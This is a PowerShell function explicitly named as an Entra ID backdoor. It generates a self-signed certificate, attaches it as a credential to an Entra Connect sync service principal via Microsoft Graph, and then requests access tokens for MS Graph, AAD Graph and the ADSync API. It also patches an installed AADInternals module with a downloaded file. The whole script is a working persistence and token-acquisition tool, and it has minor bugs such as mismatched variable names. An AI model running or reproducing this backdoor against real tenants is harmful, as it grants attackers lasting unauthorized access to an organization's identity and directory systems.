function Invoke-EntraConnectAppAuthBackdoor {
    param (
        [Parameter(Mandatory = $true)]
        [string]$ClientId,
        
        [Parameter(Mandatory = $true)]
        [string]$TenantId,

        [Parameter(Mandatory = $false)]
        [string]$CertificateOutputPath = (Get-Location).Path,

        [Parameter(Mandatory = $false)]
        [string]$CertificateName = "EntraConnectSyncBackDoor",
        
        [Parameter(Mandatory = $false)]
        [string]$CertificatePassword = "SecurePassword123!",

        [Parameter(Mandatory = $false)]
        [System.Boolean]$UseExistingCertificate = $false,

        [Parameter(Mandatory = $false)]
        [System.Boolean]$CreateNewEntraConnectApp = $false
    )

    #region Check prerequisites
    if ($PSVersionTable.PSEdition -ne 'Desktop') {
        throw "Execute the cmdlet in Windows PowerShell to ensure 100% compatibility with AADInternals."
    }
    function Install-RequiredModule {
        param(
            [Parameter(Mandatory = $true)]
            [string]$ModuleName
        )
        if (-not (Get-Module -ListAvailable -Name $ModuleName)) {
            Write-Host "Module '$ModuleName' not found. Installing from PSGallery..."
            try {
                Install-Module -Name $ModuleName -Repository PSGallery -Force -Scope CurrentUser
                Write-Host "Module '$ModuleName' installed successfully."
            } catch {
                Write-Error "Failed to install module '$ModuleName': $_"
            }
        } else {
            try {
                Import-Module -Name $ModuleName -Force -ErrorAction Stop
                Write-Host "$ModuleName has imported!"
            } catch {
                Write-Error "Failed to import module '$ModuleName': $_"
            }
        }
    }

    $RequiredModules = @("AADInternals", "Microsoft.Graph.Authentication")

    foreach ($module in $RequiredModules) {
        Install-RequiredModule -ModuleName $module
    }
    #endregion

    #region Patch Access Token function to support tokens with wrong audience
    $AadIntModuleDetails = (Get-InstalledModule -Name AADInternals)
    $AadIntVersion = "0.9.8"
    if ($module.Version -lt $AadIntVersion) {
        Update-Module -Name AADInternals
        $AadIntModuleDetails = (Get-InstalledModule -Name AADInternals)
    }
    
    if ($AadIntModuleDetails.Version -gt $AadIntVersion) {
        Write-Verbose "Patched version already installed!"
    } else {
        Write-Verbose "Patching AADInternals AT function..."
        $AadIntModulePath = $AadIntModuleDetails.InstalledLocation
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Gerenios/AADInternals/refs/heads/master/AccessToken.ps1" -OutFile "$($AadIntModulePath)\AccessToken.ps1"
    }
    #endegion

    #region Load Internal function to acquire token
    function Get-AccessTokenFromCertificate {
    
        param(
            [Parameter(Mandatory)][string]$TenantId,
            [Parameter(Mandatory)][string]$ClientId,
            [Parameter(Mandatory)][string]$Scope,
            [Parameter(Mandatory)][object]$ClientCertificate,
            [int]$ExpiresInSeconds = 60000,
            [int]$NotBeforeSkewSeconds = 300
        )

        # JWT header
        $x5t = [System.Convert]::ToBase64String(($ClientCertificate.GetCertHash()))
        $HeaderJson = @{ alg = 'RS256'; typ = 'JWT'; x5t = $x5t } | ConvertTo-Json -Compress

        # JWT payload
        $aud = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"
        $now = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
        $PayloadJson = @{
            aud = $aud
            iss = $ClientId
            sub = $ClientId
            jti = [guid]::NewGuid()
            iat = $now
            nbf = $now - [math]::Abs($NotBeforeSkewSeconds)
            exp = $now + [math]::Max($ExpiresInSeconds, 6000)
        } | ConvertTo-Json -Compress

        # Encode + sign
        $HeaderJsonBase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($HeaderJson)).Split('=')[0].Replace('+', '-').Replace('/', '_')
        $PayloadJsonBase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($PayloadJson)).Split('=')[0].Replace('+', '-').Replace('/', '_')

        $PreJwt = $HeaderJsonBase64 + "." + $PayloadJsonBase64
        $Signature = [Convert]::ToBase64String($cert.PrivateKey.SignData([System.Text.Encoding]::UTF8.GetBytes($PreJwt), [Security.Cryptography.HashAlgorithmName]::SHA256, [Security.Cryptography.RSASignaturePadding]::Pkcs1)) -replace '\+', '-' -replace '/', '_' -replace '='

        $jwt = $HeaderJsonBase64 + "." + $PayloadJsonBase64 + "." + $Signature

        $body = @{
            'tenant'                = $tenantid
            'scope'                 = $scope
            'client_assertion_type' = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
            'client_id'             = $clientID
            'grant_type'            = 'client_credentials'
            'client_assertion'      = $jwt
        }

        $token = (Invoke-RestMethod -uri "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token" -Method POST -Body $body -ContentType 'application/x-www-form-urlencoded' -UseBasicParsing).Access_Token
        return $token
    }
    #endregion

    #region Create certificate for Entra App Auth
    function New-EntraConnectAppSelfSignedCertificate {
        param(
            [Parameter(Mandatory = $true)]
            [string]$CertificateName,
            
            [Parameter(Mandatory = $false)]
            [string]$Subject = "CN=Entra Connect Sync Provisioning Backdoor",
            
            [Parameter(Mandatory = $true)]
            [string]$OutputPath,
            
            [Parameter(Mandatory = $true)]
            [string]$Password,
            
            [Parameter(Mandatory = $false)]
            [int]$ValidityDays = 365,
            
            [Parameter(Mandatory = $false)]
            [string[]]$DnsNames = @("localhost", "127.0.0.1")
        )

        # Ensure output directory exists
        if (!(Test-Path -Path $OutputPath)) {
            New-Item -ItemType Directory -Path $OutputPath -Force
            Write-Host "Created output directory: $OutputPath" -ForegroundColor Green
        }

        try {
            # Calculate expiration date
            $NotAfter = (Get-Date).AddDays($ValidityDays)
            
            Write-Host "Creating self-signed certificate..." -ForegroundColor Yellow
            Write-Host "Subject: $Subject" -ForegroundColor Cyan
            Write-Host "DNS Names: $($DnsNames -join ', ')" -ForegroundColor Cyan
            Write-Host "Valid until: $NotAfter" -ForegroundColor Cyan
            
            # Create the self-signed certificate
            $cert = New-SelfSignedCertificate -Subject $Subject `
                -DnsName $DnsNames `
                -CertStoreLocation "Cert:\CurrentUser\My" `
                -KeyUsage DigitalSignature, KeyEncipherment `
                -NotAfter $NotAfter `
                -KeyAlgorithm RSA `
                -KeyLength 2048 `
                -HashAlgorithm SHA256 `
                -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider"
            
            Write-Host "Certificate created with thumbprint: $($cert.Thumbprint)" -ForegroundColor Green
            
            # Convert password to secure string
            $securePassword = ConvertTo-SecureString -String $Password -Force -AsPlainText
            
            # Define file paths
            $pfxPath = Join-Path $OutputPath "$CertificateName.pfx"
            $cerPath = Join-Path $OutputPath "$CertificateName.cer"
            
            # Export certificate as PFX (includes private key)
            Write-Host "Exporting certificate as PFX..." -ForegroundColor Yellow
            Export-PfxCertificate -Cert $cert -FilePath $pfxPath -Password $securePassword -Force
            Write-Host "PFX file saved to: $pfxPath" -ForegroundColor Green
            
            # Export certificate as CER (public key only)
            Write-Host "Exporting certificate as CER..." -ForegroundColor Yellow
            Export-Certificate -Cert $cert -FilePath $cerPath -Force
            Write-Host "CER file saved to: $cerPath" -ForegroundColor Green
            
            # Remove certificate from store (optional - comment out if you want to keep it)
            Write-Host "Removing certificate from certificate store..." -ForegroundColor Yellow
            Remove-Item -Path "Cert:\CurrentUser\My\$($cert.Thumbprint)" -Force
            Write-Host "Certificate removed from store" -ForegroundColor Green
            
            # Display certificate information
            Write-Host "`n=== Certificate Information ===" -ForegroundColor Magenta
            Write-Host "Subject: $($cert.Subject)" -ForegroundColor White
            Write-Host "Issuer: $($cert.Issuer)" -ForegroundColor White
            Write-Host "Thumbprint: $($cert.Thumbprint)" -ForegroundColor White
            Write-Host "Serial Number: $($cert.SerialNumber)" -ForegroundColor White
            Write-Host "Not Before: $($cert.NotBefore)" -ForegroundColor White
            Write-Host "Not After: $($cert.NotAfter)" -ForegroundColor White
            Write-Host "Key Algorithm: $($cert.PublicKey.Oid.FriendlyName)" -ForegroundColor White
            Write-Host "Key Size: $($cert.PublicKey.Key.KeySize) bits" -ForegroundColor White
            
            Write-Host "`n=== Files Created ===" -ForegroundColor Magenta
            Write-Host "PFX File: $pfxPath" -ForegroundColor White
            Write-Host "CER File: $cerPath" -ForegroundColor White
            Write-Host "Password: $Password" -ForegroundColor White
            
            Write-Host "`nCertificate creation completed successfully!" -ForegroundColor Green
            
        } catch {
            Write-Error "An error occurred while creating the certificate: $($_.Exception.Message)"
            exit 1
        }
    }
    #endregion

    # Load existing or create new certificate
    $CertificatePath = Join-Path $CertificateOutputPath $CertificateName
    $CertificatePathFile = Join-Path $CertificateOutputPath ("$CertificateName.pfx")
    if ($UseExistingCertificate -eq $false) {
        try {
            $null = New-EntraConnectAppSelfSignedCertificate -CertificateName $CertificateName -OutputPath $CertificateOutputPath -Password $CertificatePassword
            $Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($CertificatePathFile, $CertificatePassword)
        } catch {
            Write-Error "Failed to create or load self-signed certificate: $($_.Exception.Message)"
            return
        }
    } else {
        try {
            $Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($CertificatePathFile, $CertificatePassword)
        } catch {
            Write-Error "Failed to load existing certificate: $($_.Exception.Message)"
            return
        }
    }
    #endregion

    #region Create or use existing Entra Connect App
    if ($CreateNewEntraConnectApp -eq $true) {
        try {
            Write-Error "Needs to be implemented!"
            Sleep 5
        } catch {
            Write-Error "Failed to create Entra Connect App: $($_.Exception.Message)"
        }
    }
    #endregion


    #region Add certificate to new or existing Entra Connect App
    Write-Host "Authentication to Microsoft Graph via Connect-MgGraph"
    Connect-MgGraph -TenantId $TenantId -Scopes Application.ReadWrite.All

    try {
        $ServicePrincipal = Invoke-MgGraphRequest -Method GET -Uri "beta/servicePrincipals('appId=$($ClientId)')"
    } catch {
        Write-Error "Cannot retrieve service principal: $($_.Exception.Message)"
    }

    $ServicePrincipalObjectId = $ServicePrincipal.id

    $PublicCertBytes = [convert]::ToBase64String((Get-Content "$CertificatePath.cer" -Encoding byte))

    $keyCredential = @{
        type        = "AsymmetricX509Cert"
        usage       = "Verify"
        key         = $($PublicCertBytes)
        displayName = $Cert.Subject
    }

    $body = @{ keyCredentials = @($keyCredential) } | ConvertTo-Json -Depth 5

    try {
        Invoke-MgGraphRequest -Method PATCH -Uri "beta/servicePrincipals/$($ServicePrincipalObjectId)" -Body $body -ContentType 'application/json'
        Write-Host "Certificate added to service principal ($ServicePrincipalObjectId)."
    } catch {
        Write-Error "Failed to add certificate: $_"
    }
    #endregion

    Write-Host "Wait 20 seconds... to have certificate in place..."
    Sleep 20;

    #region Acquire tokens
    try {
        $scope = "https://graph.microsoft.com/.default"
        $MSGraphToken = Get-AccessTokenFromCertificate -ClientId $ClientId -TenantId $TenantId -ClientCertificate $Cert -Scope $scope
    } catch {
        Write-Error "Failed to get MSGraph token: $($_.Exception.Message)"
    }

    try {
        $scope = "https://graph.windows.net/.default"
        $AADGraphToken = Get-AccessTokenFromCertificate -ClientId $ClientId -TenantId $TenantId -ClientCertificate $Cert -Scope $scope
    } catch {
        Write-Error "Failed to get AADGraph token: $($_.Exception.Message)"
    }

    try {
        $syncServiceAppId = "6bf85cfa-ac8a-4be5-b5de-425a0d0dc016"
        $scope = "$syncServiceAppId/.default"
        $AdSyncToken = Get-AccessTokenFromCertificate -ClientId $ClientId -TenantId $TenantId -ClientCertificate $Cert -Scope $scope
    } catch {
        Write-Error "Failed to get ADSync API token: $($_.Exception.Message)"
    }
    #endregion

    $Tokens = [PSCustomObject]@{
        MSGraphToken  = $MSGraphToken
        AADGraphToken = $AADGraphToken
        AdSyncToken   = $AdSyncToken
    }
    return $Tokens
}
